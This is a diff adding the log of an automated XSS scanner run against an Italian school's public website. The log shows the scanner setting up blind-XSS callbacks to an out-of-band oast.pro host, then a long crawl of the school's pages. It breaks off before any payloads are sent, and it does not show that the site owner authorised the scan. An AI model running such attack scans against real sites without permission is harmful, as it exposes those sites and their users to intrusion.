@@ -1,0 +1,1092 @@
+2025-06-17 04:54:56,231 - INFO - CLI Command: first_ai_xss.py -d iislevimontalcini.it --crawl --depth 2 -w 5
+2025-06-17 04:54:56,231 - WARNING - Gemini API key not provided via --ai-key argument or GEMINI_API_KEY env var. AI payload generation will be skipped.
+2025-06-17 04:54:56,232 - INFO - 
+==================== STARTING ADVANCED SCAN ====================
+2025-06-17 04:54:56,232 - INFO - Target: 
+2025-06-17 04:54:56,232 - CRITICAL - [33mBlind XSS payloads will use callback domain: rri5xlcaeffx.oast.pro[0m
+2025-06-17 04:54:56,232 - CRITICAL - [32mMonitor http://rri5xlcaeffx.oast.pro for interactions.[0m
+2025-06-17 04:54:59,467 - INFO - WebDriver 1 initialized successfully.[0m
+2025-06-17 04:54:59,828 - INFO - WebDriver 2 initialized successfully.[0m
+2025-06-17 04:55:00,255 - INFO - WebDriver 3 initialized successfully.[0m
+2025-06-17 04:55:00,687 - INFO - WebDriver 4 initialized successfully.[0m
+2025-06-17 04:55:01,122 - INFO - WebDriver 5 initialized successfully.[0m
+2025-06-17 04:55:01,122 - INFO - 5 drivers ready in the pool.[0m
+2025-06-17 04:55:01,123 - INFO - [1;32m[INFO][0m Crawling website: iislevimontalcini.it
+2025-06-17 04:55:01,123 - INFO - Crawling [Depth:0]: http://iislevimontalcini.it
+2025-06-17 04:55:02,429 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it#maincontent
+2025-06-17 04:55:02,969 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/
+2025-06-17 04:55:03,714 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/dirigente-scolastico
+2025-06-17 04:55:04,132 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/segreteria
+2025-06-17 04:55:04,424 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/organi-collegiali
+2025-06-17 04:55:04,917 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/regolamento-di-istituto
+2025-06-17 04:55:05,215 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/accreditamento-regionale
+2025-06-17 04:55:05,752 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/comitato-tecnico-scientifico
+2025-06-17 04:55:06,198 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/partner-territoriali
+2025-06-17 04:55:06,603 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/-privacy
+2025-06-17 04:55:06,877 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/sicurezza-
+2025-06-17 04:55:06,943 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/sicurezza- (Status: 509 or non-HTML).
+2025-06-17 04:55:06,943 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/assicurazione
+2025-06-17 04:55:07,011 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/assicurazione (Status: 509 or non-HTML).
+2025-06-17 04:55:07,011 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/piano-offerta-formativa
+2025-06-17 04:55:07,076 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/piano-offerta-formativa (Status: 509 or non-HTML).
+2025-06-17 04:55:07,076 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/curricolo-verticale-distituto
+2025-06-17 04:55:07,143 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/curricolo-verticale-distituto (Status: 509 or non-HTML).
+2025-06-17 04:55:07,143 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/educazione-civica
+2025-06-17 04:55:07,209 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/educazione-civica (Status: 509 or non-HTML).
+2025-06-17 04:55:07,210 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/moduli-moodle-per-il-recupero-del-curricolo-obbligatorio
+2025-06-17 04:55:07,275 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/moduli-moodle-per-il-recupero-del-curricolo-obbligatorio (Status: 509 or non-HTML).
+2025-06-17 04:55:07,275 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione
+2025-06-17 04:55:07,341 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione (Status: 509 or non-HTML).
+2025-06-17 04:55:07,342 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/pai
+2025-06-17 04:55:07,408 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/pai (Status: 509 or non-HTML).
+2025-06-17 04:55:07,408 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/covid-19
+2025-06-17 04:55:07,474 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/covid-19 (Status: 509 or non-HTML).
+2025-06-17 04:55:07,475 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/esame-di-stato
+2025-06-17 04:55:07,539 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/esame-di-stato (Status: 509 or non-HTML).
+2025-06-17 04:55:07,539 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/calendario-scolastico-regionale
+2025-06-17 04:55:07,605 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/calendario-scolastico-regionale (Status: 509 or non-HTML).
+2025-06-17 04:55:07,605 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/orario-lezioni
+2025-06-17 04:55:07,673 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/orario-lezioni (Status: 509 or non-HTML).
+2025-06-17 04:55:07,673 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/progetti
+2025-06-17 04:55:08,054 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/viaggi-di-istruzione
+2025-06-17 04:55:08,119 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/viaggi-di-istruzione (Status: 509 or non-HTML).
+2025-06-17 04:55:08,120 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/eipass-center
+2025-06-17 04:55:08,185 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/eipass-center (Status: 509 or non-HTML).
+2025-06-17 04:55:08,185 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/pnsd---piano-nazionale-scuola-digitale
+2025-06-17 04:55:08,251 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/pnsd---piano-nazionale-scuola-digitale (Status: 509 or non-HTML).
+2025-06-17 04:55:08,251 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/libri-di-testo-as-20202021
+2025-06-17 04:55:08,317 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/libri-di-testo-as-20202021 (Status: 509 or non-HTML).
+2025-06-17 04:55:08,317 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/modulistica-famiglie
+2025-06-17 04:55:08,383 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/modulistica-famiglie (Status: 509 or non-HTML).
+2025-06-17 04:55:08,383 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/adempimenti-vaccinali-relativi-ai-minorenni
+2025-06-17 04:55:08,449 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/adempimenti-vaccinali-relativi-ai-minorenni (Status: 509 or non-HTML).
+2025-06-17 04:55:08,449 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/orientamento
+2025-06-17 04:55:08,514 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/orientamento (Status: 509 or non-HTML).
+2025-06-17 04:55:08,514 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/diploma-istruzioni-per-il-ritiro
+2025-06-17 04:55:08,581 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/diploma-istruzioni-per-il-ritiro (Status: 509 or non-HTML).
+2025-06-17 04:55:08,582 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/area-personale
+2025-06-17 04:55:08,650 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/area-personale (Status: 509 or non-HTML).
+2025-06-17 04:55:08,650 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/archivio-news
+2025-06-17 04:55:08,716 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/archivio-news (Status: 509 or non-HTML).
+2025-06-17 04:55:08,716 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/contatti
+2025-06-17 04:55:08,786 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/contatti (Status: 509 or non-HTML).
+2025-06-17 04:55:08,786 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/pon-pcto-estero-progetto-fse--per-la-scuola-competenze-e-ambienti-per-lapprendimento-2014-2020
+2025-06-17 04:55:08,853 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/pon-pcto-estero-progetto-fse--per-la-scuola-competenze-e-ambienti-per-lapprendimento-2014-2020 (Status: 509 or non-HTML).
+2025-06-17 04:55:08,853 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/piano-estate-2024-25--programma-nazionale-scuola-e-competenze-2021-2027--fondo-sociale-europeo-plus-fse
+2025-06-17 04:55:08,919 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/piano-estate-2024-25--programma-nazionale-scuola-e-competenze-2021-2027--fondo-sociale-europeo-plus-fse (Status: 509 or non-HTML).
+2025-06-17 04:55:08,919 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/pon---fse-e-fdr---apprendimento-e-socialit-
+2025-06-17 04:55:08,984 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/pon---fse-e-fdr---apprendimento-e-socialit- (Status: 509 or non-HTML).
+2025-06-17 04:55:08,985 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/riduzione-dei-divari-negli-apprendimenti-e-contrasto-dispersione-scolastica-dm-2-febbraio-2024-n-19
+2025-06-17 04:55:09,050 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/riduzione-dei-divari-negli-apprendimenti-e-contrasto-dispersione-scolastica-dm-2-febbraio-2024-n-19 (Status: 509 or non-HTML).
+2025-06-17 04:55:09,050 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-labs-1
+2025-06-17 04:55:09,119 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-labs-1 (Status: 509 or non-HTML).
+2025-06-17 04:55:09,120 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/competenze-stem-e-multilinguistiche-nelle-scuole-statali-dm-652023
+2025-06-17 04:55:09,185 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/competenze-stem-e-multilinguistiche-nelle-scuole-statali-dm-652023 (Status: 509 or non-HTML).
+2025-06-17 04:55:09,186 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/azioni-di-prevenzione-e-contrasto-alla-dispersione-scolastica
+2025-06-17 04:55:09,251 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/azioni-di-prevenzione-e-contrasto-alla-dispersione-scolastica (Status: 509 or non-HTML).
+2025-06-17 04:55:09,251 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-class-
+2025-06-17 04:55:09,318 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-class- (Status: 509 or non-HTML).
+2025-06-17 04:55:09,318 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-labs
+2025-06-17 04:55:09,384 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-labs (Status: 509 or non-HTML).
+2025-06-17 04:55:09,384 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-tecnologico---elettrotecnico-ed-elettronico
+2025-06-17 04:55:09,449 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/istituto-tecnico-settore-tecnologico---elettrotecnico-ed-elettronico (Status: 509 or non-HTML).
+2025-06-17 04:55:09,450 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-tecnologico---chimica-materiali-e-biotecnologie
+2025-06-17 04:55:09,515 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/istituto-tecnico-settore-tecnologico---chimica-materiali-e-biotecnologie (Status: 509 or non-HTML).
+2025-06-17 04:55:09,515 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---amministrazione-finanza-e-marketing
+2025-06-17 04:55:09,581 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---amministrazione-finanza-e-marketing (Status: 509 or non-HTML).
+2025-06-17 04:55:09,581 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---turismo
+2025-06-17 04:55:09,647 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---turismo (Status: 509 or non-HTML).
+2025-06-17 04:55:09,647 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/istituto-professionale---manutenzione-e-assistenza-tecnica-curvatura-termica
+2025-06-17 04:55:09,714 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/istituto-professionale---manutenzione-e-assistenza-tecnica-curvatura-termica (Status: 509 or non-HTML).
+2025-06-17 04:55:09,714 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/istituto-professionale-servizi-per-la-sanit-e-assistenza-sociale-
+2025-06-17 04:55:09,779 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/istituto-professionale-servizi-per-la-sanit-e-assistenza-sociale- (Status: 509 or non-HTML).
+2025-06-17 04:55:09,779 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---turismo-1
+2025-06-17 04:55:09,845 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---turismo-1 (Status: 509 or non-HTML).
+2025-06-17 04:55:09,845 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/perfezionamento-iscrizioni-classi-prime-20232024
+2025-06-17 04:55:09,911 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/perfezionamento-iscrizioni-classi-prime-20232024 (Status: 509 or non-HTML).
+2025-06-17 04:55:09,912 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/brochure-offerta-formativa
+2025-06-17 04:55:09,978 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/brochure-offerta-formativa (Status: 509 or non-HTML).
+2025-06-17 04:55:09,978 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/nuovi-indirizzi-del-tecnico-economico
+2025-06-17 04:55:10,043 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/nuovi-indirizzi-del-tecnico-economico (Status: 509 or non-HTML).
+2025-06-17 04:55:10,043 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/la-4-giorni-frisali-a-udine
+2025-06-17 04:55:10,109 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/la-4-giorni-frisali-a-udine (Status: 509 or non-HTML).
+2025-06-17 04:55:10,110 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/la-fondazione-cigno--incontra-le-ragazze-e-i-ragazzi-del-rita-levi-montalcini-1
+2025-06-17 04:55:10,176 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/la-fondazione-cigno--incontra-le-ragazze-e-i-ragazzi-del-rita-levi-montalcini-1 (Status: 509 or non-HTML).
+2025-06-17 04:55:10,176 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/il-levi-montalcini-a-scuola-futura
+2025-06-17 04:55:10,242 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/il-levi-montalcini-a-scuola-futura (Status: 509 or non-HTML).
+2025-06-17 04:55:10,243 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/startup-tra-i-banchi-di-scuola-premiati-dalla-confindustria-gli-studenti-dellindirizzo-afm-sia
+2025-06-17 04:55:10,309 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/startup-tra-i-banchi-di-scuola-premiati-dalla-confindustria-gli-studenti-dellindirizzo-afm-sia (Status: 509 or non-HTML).
+2025-06-17 04:55:10,309 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/menzione-speciale-nel-concorso-fai-agri-cultura
+2025-06-17 04:55:10,375 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/menzione-speciale-nel-concorso-fai-agri-cultura (Status: 509 or non-HTML).
+2025-06-17 04:55:10,375 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/progetto-nerd
+2025-06-17 04:55:10,441 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/progetto-nerd (Status: 509 or non-HTML).
+2025-06-17 04:55:10,441 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/1-6-settembre-2023---diario-dallargentina
+2025-06-17 04:55:10,506 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/1-6-settembre-2023---diario-dallargentina (Status: 509 or non-HTML).
+2025-06-17 04:55:10,506 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/il-levi-montalcini-premiato-a-roma-dalla-fondazione-cotec
+2025-06-17 04:55:10,572 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/il-levi-montalcini-premiato-a-roma-dalla-fondazione-cotec (Status: 509 or non-HTML).
+2025-06-17 04:55:10,572 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/il-rita-levi-montalcini-allhackathon-di-piacenza-incontra-il-presidente-mattarella
+2025-06-17 04:55:10,638 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/il-rita-levi-montalcini-allhackathon-di-piacenza-incontra-il-presidente-mattarella (Status: 509 or non-HTML).
+2025-06-17 04:55:10,638 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/avvio-as-202425---orario-lezioni-e-comunicazioni
+2025-06-17 04:55:10,704 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/avvio-as-202425---orario-lezioni-e-comunicazioni (Status: 509 or non-HTML).
+2025-06-17 04:55:10,704 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/eccellenza-e-merito-gli-studenti-premiati-allistituto-rita-levi-montalcini
+2025-06-17 04:55:10,769 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/eccellenza-e-merito-gli-studenti-premiati-allistituto-rita-levi-montalcini (Status: 509 or non-HTML).
+2025-06-17 04:55:10,769 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/il-corso-di-biotecnologie-ambientali-vince-il-premio-acqui-ambiente-2024
+2025-06-17 04:55:10,834 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/il-corso-di-biotecnologie-ambientali-vince-il-premio-acqui-ambiente-2024 (Status: 509 or non-HTML).
+2025-06-17 04:55:10,834 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/voci-fuori-campo-emozioni-in-scena-alla-sala-ex-kaimano---il-gran-finale-del-laboratorio-teatrale-dellistituto-montalcini
+2025-06-17 04:55:10,899 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/voci-fuori-campo-emozioni-in-scena-alla-sala-ex-kaimano---il-gran-finale-del-laboratorio-teatrale-dellistituto-montalcini (Status: 509 or non-HTML).
+2025-06-17 04:55:10,900 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/convegno-una-storia-dentro-le-carte
+2025-06-17 04:55:10,967 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/convegno-una-storia-dentro-le-carte (Status: 509 or non-HTML).
+2025-06-17 04:55:10,967 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/allenamento-fuori-dagli-schemi-quando-la-citt-diventa-la-tua-palestra--il-progetto-suburban
+2025-06-17 04:55:11,032 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/allenamento-fuori-dagli-schemi-quando-la-citt-diventa-la-tua-palestra--il-progetto-suburban (Status: 509 or non-HTML).
+2025-06-17 04:55:11,033 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/liis-rita-levi-montalcini-si-distingue-al-campionato-provinciale-di-atletica-leggera
+2025-06-17 04:55:11,098 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/liis-rita-levi-montalcini-si-distingue-al-campionato-provinciale-di-atletica-leggera (Status: 509 or non-HTML).
+2025-06-17 04:55:11,098 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/la-classe-v-sez-m-delliis--rita-levi-montalcini--primo-premio-nel-contest-nazionale-rotaract
+2025-06-17 04:55:11,164 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/la-classe-v-sez-m-delliis--rita-levi-montalcini--primo-premio-nel-contest-nazionale-rotaract (Status: 509 or non-HTML).
+2025-06-17 04:55:11,164 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/amministrazione-trasparente
+2025-06-17 04:55:11,230 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/amministrazione-trasparente (Status: 509 or non-HTML).
+2025-06-17 04:55:11,230 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/albo-online
+2025-06-17 04:55:11,296 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/albo-online (Status: 509 or non-HTML).
+2025-06-17 04:55:11,296 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/prenotazioni/
+2025-06-17 04:55:11,362 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/prenotazioni/ (Status: 509 or non-HTML).
+2025-06-17 04:55:11,362 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/pagine/codice-disciplinare-e-codici-di-comportamento
+2025-06-17 04:55:11,428 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/codice-disciplinare-e-codici-di-comportamento (Status: 509 or non-HTML).
+2025-06-17 04:55:11,428 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/comunicati
+2025-06-17 04:55:11,493 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/comunicati (Status: 509 or non-HTML).
+2025-06-17 04:55:11,493 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/cookie-policy
+2025-06-17 04:55:11,559 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/cookie-policy (Status: 509 or non-HTML).
+2025-06-17 04:55:11,560 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/note-legali
+2025-06-17 04:55:11,627 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/note-legali (Status: 509 or non-HTML).
+2025-06-17 04:55:11,627 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/urp
+2025-06-17 04:55:11,693 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/urp (Status: 509 or non-HTML).
+2025-06-17 04:55:11,693 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/whistleblowing
+2025-06-17 04:55:11,758 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/whistleblowing (Status: 509 or non-HTML).
+2025-06-17 04:55:11,759 - INFO - Crawling [Depth:1]: http://iislevimontalcini.it/disclaimer
+2025-06-17 04:55:11,824 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/disclaimer (Status: 509 or non-HTML).
+2025-06-17 04:55:11,824 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/#maincontent
+2025-06-17 04:55:11,890 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/#maincontent (Status: 509 or non-HTML).
+2025-06-17 04:55:11,890 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/dirigente-scolastico#maincontent
+2025-06-17 04:55:11,956 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/dirigente-scolastico#maincontent (Status: 509 or non-HTML).
+2025-06-17 04:55:11,956 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/panoramica/Istituto?source=1
+2025-06-17 04:55:12,022 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/panoramica/Istituto?source=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:12,022 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393322
+2025-06-17 04:55:12,173 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393322 (Status: 200 or non-HTML).
+2025-06-17 04:55:12,173 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393322&inl=1
+2025-06-17 04:55:12,419 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393322&inl=1 (Status: 200 or non-HTML).
+2025-06-17 04:55:12,419 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393323
+2025-06-17 04:55:12,622 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393323 (Status: 200 or non-HTML).
+2025-06-17 04:55:12,622 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393323&inl=1
+2025-06-17 04:55:12,808 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393323&inl=1 (Status: 200 or non-HTML).
+2025-06-17 04:55:12,809 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/segreteria#maincontent
+2025-06-17 04:55:12,939 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/segreteria#maincontent (Status: 509 or non-HTML).
+2025-06-17 04:55:12,939 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/organi-collegiali#maincontent
+2025-06-17 04:55:13,005 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/organi-collegiali#maincontent (Status: 509 or non-HTML).
+2025-06-17 04:55:13,005 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2848940
+2025-06-17 04:55:13,178 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2848940 (Status: 200 or non-HTML).
+2025-06-17 04:55:13,178 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2848940&inl=1
+2025-06-17 04:55:13,444 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2848940&inl=1 (Status: 200 or non-HTML).
+2025-06-17 04:55:13,444 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=393
+2025-06-17 04:55:13,892 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=393 (Status: 200 or non-HTML).
+2025-06-17 04:55:13,892 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=393
+2025-06-17 04:55:14,161 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=393 (Status: 200 or non-HTML).
+2025-06-17 04:55:14,163 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=391
+2025-06-17 04:55:14,455 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=391 (Status: 200 or non-HTML).
+2025-06-17 04:55:14,455 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=391
+2025-06-17 04:55:14,675 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=391 (Status: 200 or non-HTML).
+2025-06-17 04:55:14,676 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=389
+2025-06-17 04:55:14,905 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=389 (Status: 200 or non-HTML).
+2025-06-17 04:55:14,905 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=389
